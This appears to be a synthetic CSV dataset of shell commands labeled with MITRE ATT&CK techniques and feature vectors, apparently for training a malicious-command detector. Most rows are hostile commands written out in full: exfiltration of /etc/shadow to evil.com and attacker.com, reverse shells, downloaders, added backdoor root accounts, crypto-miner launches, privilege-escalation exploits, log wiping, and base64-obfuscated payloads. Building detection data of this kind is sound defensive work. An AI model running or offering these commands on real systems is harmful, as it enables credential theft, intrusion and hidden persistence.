nohup psexec.py Administrator:password@10.0.0.5 cmd.exe &,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1021_Remote_Services'],synthetic
cat /etc/os-release,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['T1082_System_Information_Discovery'],synthetic
curl -sL http://evil.com/shell.sh -o /tmp/shell.sh,"[0, 1, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1105_Ingress_Tool_Transfer'],synthetic
echo 'bm1jbGkgY29ubmVjdGlvbiBzaG93' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1016_System_Network_Config_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
time echo 'ZWNobyAnYUdWc2JHOD0nIHwgYmFzZTY0IC1kIHwgYmFzaA==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.32, 1, 0]",['T1027_Obfuscated_Files_or_Information'],synthetic
echo  'aGVsbG8='  |  base64  -d  |  bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]",['T1027_Obfuscated_Files_or_Information'],synthetic
Get-LocalGroupMember  -Group  Administrators,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1069_Permission_Groups_Discovery'],synthetic
nohup nmap -A -T4 192.168.1.0/24 &,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.24, 0, 0]",['T1046_Network_Service_Scanning'],synthetic
"bash -c ""echo 'cGhwIC1yICckc29jaz1mc29ja29wZW4oIjEwLjAuMC45OSIsNDQ0NCk7IC4uLic=' | base64 -d | bash""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.36, 1, 0]","['T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
"runuser -l postgres -c 'psql -c ""SELECT pg_read_file(\'/etc/passwd\')""'","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.32, 0, 0]",['T1078_Valid_Accounts'],synthetic
nmap -sV --version-intensity 5 -p 1-65535 10.0.0.1,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.28, 0, 0]",['T1046_Network_Service_Scanning'],synthetic
sudo ip route show,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1016_System_Network_Config_Discovery'],synthetic
echo  'ZnBpbmcgLWEgLWcgMTkyLjE2OC4xLjAvMjQgMj4vZGV2L251bGw='  |  base64  -d  |  bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1018_Remote_System_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
"python3 -c ""import urllib.request; urllib.request.urlopen('http://evil.com/?' + open('/etc/shadow').read())""","[0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 0, 0]",['T1041_Exfiltration_Over_C2_Channel'],synthetic
echo 'backdoor:x:0:0:root:/root:/bin/bash' >> /etc/passwd,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1098_Account_Manipulation'],synthetic
nmap  --script=vuln  10.0.0.1  &&  history  -c,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.24, 1, 0]","['T1046_Network_Service_Scanning', 'T1059_Command_and_Scripting_Interpreter']",synthetic
su -s /bin/bash www-data,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1078_Valid_Accounts'],synthetic
"bash -c ""ssh -i ~/.ssh/stolen_key root@10.0.0.5""","[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1021_Remote_Services'],synthetic
for i in $(seq 1 254); do ping -c1 -W1 192.168.0.$i &>/dev/null && echo 192.168.0.$i; done,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.64, 1, 0]",['T1018_Remote_System_Discovery'],synthetic
sudo medusa -h 10.0.0.1 -u root -P /tmp/passwords.txt -M ssh,"[1, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.4, 0, 0]",['T1110_Brute_Force'],synthetic
cat /etc/group,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['T1069_Permission_Groups_Discovery'],synthetic
wget -q -O- --header='X-Auth: token123' http://evil.com/cmd,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1071_Application_Layer_Protocol'],synthetic
"bash -c ""./pwnkit""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1068_Exploitation_for_Privilege_Escalation'],synthetic
./dirtycow /etc/passwd 'root::0:0:root:/root:/bin/bash',"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 1]",['T1068_Exploitation_for_Privilege_Escalation'],synthetic
"python3 -c ""import urllib.request; urllib.request.urlopen('http://evil.com/?' + open('/etc/shadow').read())""","[0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 0, 0]",['T1041_Exfiltration_Over_C2_Channel'],synthetic
"ldapsearch -x -b 'dc=domain,dc=com' '(objectClass=person)' && sleep 1","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.32, 1, 0]","['T1087_Account_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
arp-scan --localnet,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.08, 0, 0]",['T1018_Remote_System_Discovery'],synthetic
dmesg | head -20,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.16, 1, 0]",['T1082_System_Information_Discovery'],synthetic
gcc exploit.c -o exploit && ./exploit,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 1, 0]",['T1068_Exploitation_for_Privilege_Escalation'],synthetic
echo 'ZWNobyAnKi81ICogKiAqICogY3VybCBodHRwOi8vYzIuY29tL2JlYWNvbicgfCBjcm9udGFiIC0=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1053_Scheduled_Task', 'T1027_Obfuscated_Files_or_Information']",synthetic
usermod -aG sudo compromised_user ; sleep 1,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 1, 0]","['T1098_Account_Manipulation', 'T1059_Command_and_Scripting_Interpreter']",synthetic
find / -perm -4000 -type f 2>/dev/null,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.28, 0, 0]",['T1083_File_and_Directory_Discovery'],synthetic
echo -e '\x2f\x62\x69\x6e\x2f\x62\x61\x73\x68',"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1027_Obfuscated_Files_or_Information'],synthetic
reg delete HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v Defender,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1112_Modify_Registry'],synthetic
echo 'dXNlcmFkZCAtbSAtcyAvYmluL2Jhc2ggLUcgc3VkbyBuZXdhZG1pbg==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1098_Account_Manipulation', 'T1027_Obfuscated_Files_or_Information']",synthetic
time echo 'ZmluZCAvIC1uYW1lICdpZF9yc2EnIDI+L2Rldi9udWxs' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.32, 1, 0]","['T1003_OS_Credential_Dumping', 'T1027_Obfuscated_Files_or_Information']",synthetic
"bash -c ""scp attacker@10.0.0.99:/tools/linpeas.sh /tmp/""","[1, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1105_Ingress_Tool_Transfer'],synthetic
wmic useraccount list | echo done,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.24, 1, 0]","['T1087_Account_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
nohup curl -X POST http://evil.com/collect -d @/etc/shadow | sleep 1 &,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.44, 1, 0]","['T1041_Exfiltration_Over_C2_Channel', 'T1059_Command_and_Scripting_Interpreter']",synthetic
net user /add attacker P@ssw0rd ; echo done,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.32, 1, 0]","['T1136_Create_Account', 'T1059_Command_and_Scripting_Interpreter']",synthetic
ip neigh show,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1016_System_Network_Config_Discovery'],synthetic
cat /etc/hostname,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['BENIGN'],synthetic
nohup echo 'Y2F0IC9ldGMvc2hhZG93IHwgbmMgMTAuMC4wLjk5IDQ0NDQ=' | base64 -d | bash &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.36, 1, 0]","['T1041_Exfiltration_Over_C2_Channel', 'T1027_Obfuscated_Files_or_Information']",synthetic
uname -a,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.08, 0, 0]",['T1082_System_Information_Discovery'],synthetic
reg delete HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v Defender ; echo done,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.32, 1, 0]","['T1112_Modify_Registry', 'T1059_Command_and_Scripting_Interpreter']",synthetic
Get-LocalGroupMember -Group Administrators && sleep 1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 1, 0]","['T1069_Permission_Groups_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
nohup  ./xmrig  --url  stratum+tcp://pool.minexmr.com:443  --user  wallet  &,"[0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 0, 0]",['T1496_Resource_Hijacking'],synthetic
passwd -d root,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1098_Account_Manipulation'],synthetic
git clone https://github.com/user/repo.git,"[0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['BENIGN'],synthetic
New-ItemProperty -Path 'HKLM:\...' -Name Persist -Value 'C:\payload.exe',"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 0, 0]",['T1112_Modify_Registry'],synthetic
"bash -c ""echo '' > /var/log/syslog | > /dev/null 2>&1""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 1, 0, 0, 0.2, 0.4, 1, 0]","['T1070_Indicator_Removal', 'T1059_Command_and_Scripting_Interpreter']",synthetic
"bash -c ""echo 'Y3VybCAtc0wgaHR0cDovL2V2aWwuY29tL3htcmlnIHwgYmFzaA==' | base64 -d | bash""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.36, 1, 0]","['T1496_Resource_Hijacking', 'T1027_Obfuscated_Files_or_Information']",synthetic
./CVE-2021-4034,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.04, 0, 1]",['T1068_Exploitation_for_Privilege_Escalation'],synthetic
cat /etc/network/interfaces,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['T1016_System_Network_Config_Discovery'],synthetic
useradd -m -s /bin/bash hacker ; > /dev/null 2>&1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.36, 1, 0]","['T1136_Create_Account', 'T1059_Command_and_Scripting_Interpreter']",synthetic
traceroute google.com,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['BENIGN'],synthetic
cat /etc/resolv.conf,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['T1016_System_Network_Config_Discovery'],synthetic
nohup echo 'bWVkdXNhIC1oIDEwLjAuMC4xIC11IHJvb3QgLVAgL3RtcC9wYXNzd29yZHMudHh0IC1NIHNzaCA7IGVjaG8gZG9uZQ==' | base64 -d | bash &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.36, 1, 0]","['T1110_Brute_Force', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
crontab -e,"[0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['T1053_Scheduled_Task'],synthetic
time openssl rand -hex 16,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['BENIGN'],synthetic
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.0.0.1,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1110_Brute_Force'],synthetic
cat ~/.aws/credentials,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['T1003_OS_Credential_Dumping'],synthetic
wget  -q  http://miner.com/xmrig  -O  /tmp/xmr  &&  chmod  +x  /tmp/xmr  &&  /tmp/xmr  -o  pool.minexmr.com:443,"[0, 1, 1, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.52, 1, 0]",['T1496_Resource_Hijacking'],synthetic
wget --post-file=/etc/passwd http://attacker.com/receive ; sleep 1,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 1, 0]","['T1041_Exfiltration_Over_C2_Channel', 'T1059_Command_and_Scripting_Interpreter']",synthetic
cat  /etc/passwd  |  grep  -v  nologin,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.24, 1, 0]",['T1003_OS_Credential_Dumping'],synthetic
curl -A 'Mozilla/5.0' http://c2.attacker.com/check-in ; history -c,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.28, 1, 0]","['T1071_Application_Layer_Protocol', 'T1059_Command_and_Scripting_Interpreter']",synthetic
echo 'bmNyYWNrIC1wIDIyIC0tdXNlciByb290IC1QIHBhc3MubHN0IDEwLjAuMC4x' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1110_Brute_Force', 'T1027_Obfuscated_Files_or_Information']",synthetic
"perl -e 'eval pack q/H*/, q/7363726970742e6570732f52656d6f74652e706e67/' && > /dev/null 2>&1","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 1, 0, 0, 0.0, 0.4, 1, 0]","['T1027_Obfuscated_Files_or_Information', 'T1059_Command_and_Scripting_Interpreter']",synthetic
time secretsdump.py -just-dc-user Administrator domain/user:pass@DC,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1003_OS_Credential_Dumping'],synthetic
for i in $(seq 1 254); do ping -c1 -W1 192.168.0.$i &>/dev/null && echo 192.168.0.$i; done,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.64, 1, 0]",['T1018_Remote_System_Discovery'],synthetic
ls -la /root /etc /var/www,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1083_File_and_Directory_Discovery'],synthetic
wmiexec.py domain/admin:pass@10.0.0.5 | sleep 1,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.2, 1, 0]","['T1021_Remote_Services', 'T1059_Command_and_Scripting_Interpreter']",synthetic
"bash -c ""reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v Backdoor /d C:\payload.exe""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.36, 0, 0]",['T1112_Modify_Registry'],synthetic
echo 'c2hyZWQgLXUgL3Zhci9sb2cvYXV0aC5sb2cgJiYgaGlzdG9yeSAtYw==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1070_Indicator_Removal', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
"bash -c ""python3 -c ""import urllib.request; urllib.request.urlopen('http://evil.com/?' + open('/etc/shadow').read())""""","[0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.36, 0, 0]",['T1041_Exfiltration_Over_C2_Channel'],synthetic
groups ; history -c,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.16, 1, 0]","['T1033_System_Owner_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
at now + 1 minute <<< '/tmp/payload',"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 0, 0]",['T1053_Scheduled_Task'],synthetic
echo 'bGFzdCAtbiAxMA==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1033_System_Owner_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
echo 'backdoor:x:0:0:root:/root:/bin/bash' >> /etc/passwd,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1098_Account_Manipulation'],synthetic
net user /add attacker P@ssw0rd,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1136_Create_Account'],synthetic
route -n,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['T1016_System_Network_Config_Discovery'],synthetic
sudo bash -i >& /dev/tcp/10.0.0.99/4444 0>&1,"[1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1059_Command_and_Scripting_Interpreter'],synthetic
sudo echo '' > /var/log/syslog,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1070_Indicator_Removal'],synthetic
net  localgroup  administrators,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1069_Permission_Groups_Discovery'],synthetic
echo  'PiB+Ly5iYXNoX2hpc3RvcnkgJiYgaGlzdG9yeSAtYw=='  |  base64  -d  |  bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1070_Indicator_Removal', 'T1027_Obfuscated_Files_or_Information']",synthetic
time echo 'dXNlcmFkZCAtbyAtdSAwIC1nIDAgLU0gLWQgL3Jvb3QgLXMgL2Jpbi9iYXNoIGdob3N0IHwgPiAvZGV2L251bGwgMj4mMQ==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.32, 1, 0]","['T1136_Create_Account', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
"python3 -c ""import os; os.system('id')""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1059_Command_and_Scripting_Interpreter'],synthetic
echo 'dXNlcmFkZCAtbyAtdSAwIC1nIDAgLU0gLWQgL3Jvb3QgLXMgL2Jpbi9iYXNoIGdob3N0' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1136_Create_Account', 'T1027_Obfuscated_Files_or_Information']",synthetic
echo 'ZmluZCAvaG9tZSAtbmFtZSAnLmVudicgMj4vZGV2L251bGw=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1083_File_and_Directory_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
time echo 'bmV0IHVzZXIgL2RvbWFpbiAmJiBzbGVlcCAx' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.32, 1, 0]","['T1087_Account_Discovery', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
crontab -e ; > /dev/null 2>&1,"[0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.24, 1, 0]","['T1053_Scheduled_Task', 'T1059_Command_and_Scripting_Interpreter']",synthetic
nohup passwd -d root &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1098_Account_Manipulation'],synthetic
echo 'dw==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1033_System_Owner_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
time net user /add attacker P@ssw0rd,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1136_Create_Account'],synthetic
"bash -c ""wmic useraccount list | > /dev/null 2>&1""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.2, 0.36, 1, 0]","['T1087_Account_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
echo 'Z3JvdXBzICQod2hvYW1pKQ==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1069_Permission_Groups_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
systemctl status apache2,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['BENIGN'],synthetic
nc -e /bin/bash attacker.com 80 ; chmod +x /tmp/payload,"[0, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.36, 1, 1]","['T1071_Application_Layer_Protocol', 'T1059_Command_and_Scripting_Interpreter']",synthetic
export LANG=en_US.UTF-8,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['BENIGN'],synthetic
"bash -c ""echo 'dXNlcmFkZCAtbyAtdSAwIC1nIDAgLU0gLWQgL3Jvb3QgLXMgL2Jpbi9iYXNoIGdob3N0' | base64 -d | bash""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.36, 1, 0]","['T1136_Create_Account', 'T1027_Obfuscated_Files_or_Information']",synthetic
nohup systemctl enable --now malicious.service &,"[0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1053_Scheduled_Task'],synthetic
passwd -d root,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1098_Account_Manipulation'],synthetic
sudo wget -q -O- --header='X-Auth: token123' http://evil.com/cmd,"[0, 1, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 0, 0]",['T1071_Application_Layer_Protocol'],synthetic
time git clone https://github.com/user/repo.git,"[0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['BENIGN'],synthetic
time ./CVE-2021-4034 | echo done,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.2, 1, 0]","['T1068_Exploitation_for_Privilege_Escalation', 'T1059_Command_and_Scripting_Interpreter']",synthetic
history -c && history -w,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.2, 1, 0]",['T1070_Indicator_Removal'],synthetic
groups $(whoami),"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['T1069_Permission_Groups_Discovery'],synthetic
sudo curl -sL http://evil.com/shell.sh -o /tmp/shell.sh && history -c,"[0, 1, 1, 0, 1, 0, 0, 0, 1, 1, 0, 0, 0, 0, 0, 0.0, 0.36, 1, 0]","['T1105_Ingress_Tool_Transfer', 'T1059_Command_and_Scripting_Interpreter']",synthetic
nmap -A -T4 192.168.1.0/24,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.16, 0, 0]",['T1046_Network_Service_Scanning'],synthetic
"bash -c ""certutil.exe -urlcache -split -f http://attacker.com/nc.exe nc.exe ; chmod +x /tmp/payload""","[0, 1, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 1, 0.0, 0.48, 1, 1]","['T1105_Ingress_Tool_Transfer', 'T1059_Command_and_Scripting_Interpreter']",synthetic
./CVE-2021-4034 && echo done,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 1, 1]","['T1068_Exploitation_for_Privilege_Escalation', 'T1059_Command_and_Scripting_Interpreter']",synthetic
./pwnkit && > /dev/null 2>&1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.2, 1, 1]","['T1068_Exploitation_for_Privilege_Escalation', 'T1059_Command_and_Scripting_Interpreter']",synthetic
echo 'cmVnIGFkZCBIS0xNXFNvZnR3YXJlXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFJ1biAvdiBCYWNrZG9vciAvZCBDOlxwYXlsb2FkLmV4ZQ==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1112_Modify_Registry', 'T1027_Obfuscated_Files_or_Information']",synthetic
certutil.exe -urlcache -split -f http://attacker.com/nc.exe nc.exe && echo done,"[0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0.0, 0.36, 1, 0]","['T1105_Ingress_Tool_Transfer', 'T1059_Command_and_Scripting_Interpreter']",synthetic
su -s /bin/bash www-data,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1078_Valid_Accounts'],synthetic
"bash -c ""echo 'cHl0aG9uMyAtYyAiZXhlYyhfX2ltcG9ydF9fKCdiYXNlNjQnKS5iNjRkZWNvZGUoJ2FXMXdiM0owSUc5eicpLmRlY29kZSgpKSI=' | base64 -d | bash""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.36, 1, 0]",['T1027_Obfuscated_Files_or_Information'],synthetic
